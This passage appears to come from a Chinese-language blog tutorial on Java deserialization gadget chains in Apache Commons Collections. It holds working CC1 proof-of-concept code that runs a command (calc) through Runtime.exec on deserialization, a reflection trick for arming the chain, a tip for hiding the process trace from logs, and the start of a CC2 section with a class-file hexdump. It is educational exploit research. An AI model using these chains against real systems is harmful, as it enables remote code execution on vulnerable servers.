java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class,proxymap);<span class="hljs-comment">//再次实例化一个AnnotationInvocationHandler，并且将proxymap传入给memberValues</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此利用链为</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-comment">//感觉作者在炫技，太巧了，QAQ</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><blockquote><p>p 牛提到，调试过程中出现还没有到<code>readObject</code>就弹出了计算器，原因是：在使用 Proxy 代理了 map 对象后，在任何地方执行 map 的方法就会触发 Payload 弹出计算器，所以，在本地调试代码的时候，因为调试器会调用一些 toString 之类的方法，导致不经意间触发了命令</p><p>另一个就是在执行完可见控制台出现了 ProcessImpl 异常，为了防止日志记录，我们可以在 ChainedTransformer 增加一个 ConstantTransformer(1)，从而掩盖了进程的日志特征</p></blockquote><ul><li>第一个问题，ysoserial 处理的方式为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        Transformer[] actualeviltransformer = &#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(Runtime.class),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="hljs-comment">//                new ConstantTransformer(1)</span><br><span class="hljs-comment">//        &#125;;</span><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        <span class="hljs-comment">//fake u</span><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxymap);<span class="hljs-comment">//再次实例化一个AnnotationInvocationHandler，并且将proxymap传入给memberValues</span><br><br>        <span class="hljs-comment">//arm with actual evil transformer chain</span><br>        Field iTransformersF = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//        iTransformersF.set(fakechainedTransformer,actualeviltransformer);</span><br>        iTransformersF.set(fakechainedTransformer,chainedTransformer);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里也有个小细节，为什么假<code>Transformer</code>数组需要串起来，而反而元素更多的 evil<code>Transformer</code>数组没有串起来</p><blockquote><p>调整 actualeviltransformer 或 chainedTransformer 的注释，以及反射修改 iTransformersF 变量的注释，可以发现串起来的没有弹出计算器</p></blockquote><p>因为使用<code>LazyMap.decorate</code>装饰，没有第二个参数为<code>Transformer[]</code>的重载方法，因此必须串起来，而<code>ChainedTransformer</code>有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br></code></pre></td></tr></table></figure><p>而通过反射修改到的<code>ChainedTransformer</code>属性<code>iTransformers</code>却是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png"></p><blockquote><p>后记：这条链分析在入门的时候难度确实挺大的，但是发现不会的就反复看源码和上下文，找资料写 demo，调试分析，还是一步步地学习分析了一遍，尤其是编写一块对如何构造有了初步的理解；后面是 AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()，为了能触发 invoke，使用了动态代理的方式，那能不能使用反射调用 AnnotationInvocationHandler.invoke()呢？</p><p>其实这个想法很蠢，说到底还是学习庞杂的内容造成的幻觉，当然能够调用这个 invoke 方法，但是这个 invoke 方法需要传入的都是代理对象，代理对象内的方法</p><p>具体的细节更应该关注的是，调用了代理对象如何触发了 invoke 方法，以及传入的参数是从哪里获得的</p><p>LazyMap 在 CommonsCollections4.0 没有 LazyMap.decorate 方法，而是改了一个名 LazyMap.lazymap</p><p>因此 CC1、CC3 都可以用 CommonsCollections4 的 jar 包，在 LazyMap 时换一下方法名而已</p></blockquote><h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="Pre-1"><a href="#Pre-1" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p><p>javassit</p></blockquote><h4 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-1"><a href="#关键类-1" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">TransformingComparator</span><br></code></pre></td></tr></table></figure><p>maven 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先来学习一些铺垫的前置知识，源代码、字节码、机器码这些概念就不再赘述了</p><p>字节码文件是有固定的结构的，<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">JVM 规范</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs class">ClassFile &#123;<br>    u4             magic;//cafe babe是魔数即class文件标识符,JVM加载class文件时会先读取这4个字节<br>    u2             minor_version;//副版本号<br>    u2             major_version;//主版本号 0034是jdk1.8<br>    u2             constant_pool_count;//常量池计数器<br>    cp_info        constant_pool[constant_pool_count-1];//常量池<br>    u2             access_flags;//访问标识<br>    u2             this_class;//当前类<br>    u2             super_class;//父类<br>    u2             interfaces_count;//类继承或实现接口数<br>    u2             interfaces[interfaces_count];//接口数组<br>    u2             fields_count;//类成员变量数<br>    field_info     fields[fields_count];//类成员变量数组<br>    u2             methods_count;//类成员方法数<br>    method_info    methods[methods_count];//类成员方法数组<br>    u2             attributes_count;//类属性数<br>    attribute_info attributes[attributes_count];//属性数组<br>&#125;<br></code></pre></td></tr></table></figure><p>在 JVM 规范中<code>u1</code>、<code>u2</code>、<code>u4</code>分别表示的是 1、2、4 个字节的无符号数，可使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。除此之外，表结构(<code>table</code>)由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>、<code>attribute_info</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span>: cafe babe <span class="hljs-number">0000</span> <span class="hljs-number">0034</span> <span class="hljs-number">001</span>d <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0600</span> <span class="hljs-number">0</span>f<span class="hljs-number">09</span>  .......<span class="hljs-number">4</span>........<br><span class="hljs-attribute">00000010</span>: <span class="hljs-number">0010</span> <span class="hljs-number">0011</span> <span class="hljs-number">0800</span> <span class="hljs-number">120</span>a <span class="hljs-number">0013</span> <span class="hljs-number">0014</span> <span class="hljs-number">0700</span> <span class="hljs-number">1507</span>  ................<br><span class="hljs-attribute">00000020</span>: <span class="hljs-number">0016</span> <span class="hljs-number">0100</span> <span class="hljs-number">063</span>c <span class="hljs-number">696</span>e <span class="hljs-number">6974</span> <span class="hljs-number">3</span>e<span class="hljs-number">01</span> <span class="hljs-number">0003</span> <span class="hljs-number">2829</span>  .....&lt;init&gt;...()<br><span class="hljs-attribute">00000030</span>: <span class="hljs-number">5601</span> <span class="hljs-number">0004</span> <span class="hljs-number">436</span>f <span class="hljs-number">6465</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>f<span class="hljs-number">4</span>c <span class="hljs-number">696</span>e <span class="hljs-number">654</span>e  V...Code...LineN<br><span class="hljs-attribute">00000040</span>: <span class="hljs-number">756</span>d <span class="hljs-number">6265</span> <span class="hljs-number">7254</span> <span class="hljs-number">6162</span> <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">0100</span> <span class="hljs-number">046</span>d <span class="hljs-number">6169</span>  umberTable...mai<br><span class="hljs-attribute">00000050</span>: <span class="hljs-number">6</span>e<span class="hljs-number">01</span> <span class="hljs-number">0016</span> <span class="hljs-number">285</span>b <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span>  n...([Ljava/lang<br><span class="hljs-attribute">00000060</span>: <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">53</span> <span class="hljs-number">6</span>f<span class="hljs-number">75</span>  /String;)V...Sou<br><span class="hljs-attribute">00000070</span>: <span class="hljs-number">7263</span> <span class="hljs-number">6546</span> <span class="hljs-number">696</span>c <span class="hljs-number">6501</span> <span class="hljs-number">0008</span> <span class="hljs-number">4343</span> <span class="hljs-number">322</span>e <span class="hljs-number">6</span>a<span class="hljs-number">61</span>  rceFile...CC<span class="hljs-number">2</span>.ja<br><span class="hljs-attribute">00000080</span>: <span class="hljs-number">7661</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0700</span> <span class="hljs-number">0807</span> <span class="hljs-number">0017</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1800</span> <span class="hljs-number">1901</span>  va..............<br><span class="hljs-attribute">00000090</span>: <span class="hljs-number">000</span>b <span class="hljs-number">4865</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">6</span>f<span class="hljs-number">20</span> <span class="hljs-number">576</span>f <span class="hljs-number">726</span>c <span class="hljs-number">6407</span> <span class="hljs-number">001</span>a  ..Hello World...<br><span class="hljs-attribute">000000a0</span>: <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1</span>b<span class="hljs-number">00</span> <span class="hljs-number">1</span>c<span class="hljs-number">01</span> <span class="hljs-number">001</span>a <span class="hljs-number">436</span>f <span class="hljs-number">6</span>d<span class="hljs-number">6</span>d <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e <span class="hljs-number">7343</span>  ........CommonsC<br><span class="hljs-attribute">000000b0</span>: <span class="hljs-number">6</span>f<span class="hljs-number">6</span>c <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">6374</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e<span class="hljs-number">73</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span> <span class="hljs-number">4332</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span>  ollections/CC<span class="hljs-number">2</span>/C<br><span class="hljs-attribute">000000c0</span>: <span class="hljs-number">4332</span> <span class="hljs-number">0100</span> <span class="hljs-number">106</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">4</span>f  C<span class="hljs-number">2</span>...java/lang/O<br><span class="hljs-attribute">000000d0</span>: <span class="hljs-number">626</span>a <span class="hljs-number">6563</span> <span class="hljs-number">7401</span> <span class="hljs-number">0010</span> <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">6</span>c <span class="hljs-number">616</span>e  bject...java/lan<br><span class="hljs-attribute">000000e0</span>: <span class="hljs-number">672</span>f <span class="hljs-number">5379</span> <span class="hljs-number">7374</span> <span class="hljs-number">656</span>d <span class="hljs-number">0100</span> <span class="hljs-number">036</span>f <span class="hljs-number">7574</span> <span class="hljs-number">0100</span>  g/System...out..<br><span class="hljs-attribute">000000f0</span>: <span class="hljs-number">154</span>c <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">69</span> <span class="hljs-number">6</span>f<span class="hljs-number">2</span>f <span class="hljs-number">5072</span> <span class="hljs-number">696</span>e <span class="hljs-number">7453</span>  .Ljava/io/PrintS<br><span class="hljs-attribute">00000100</span>: <span class="hljs-number">7472</span> <span class="hljs-number">6561</span> <span class="hljs-number">6</span>d<span class="hljs-number">3</span>b <span class="hljs-number">0100</span> <span class="hljs-number">136</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">696</span>f  tream;...java/io<br><span class="hljs-attribute">00000110</span>: <span class="hljs-number">2</span>f<span class="hljs-number">50</span> <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">5374</span> <span class="hljs-number">7265</span> <span class="hljs-number">616</span>d <span class="hljs-number">0100</span> <span class="hljs-number">0770</span>  /PrintStream...p<br><span class="hljs-attribute">00000120</span>: <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>e <span class="hljs-number">0100</span> <span class="hljs-number">1528</span> <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f  rintln...(Ljava/<br><span class="hljs-attribute">00000130</span>: <span class="hljs-number">6</span>c<span 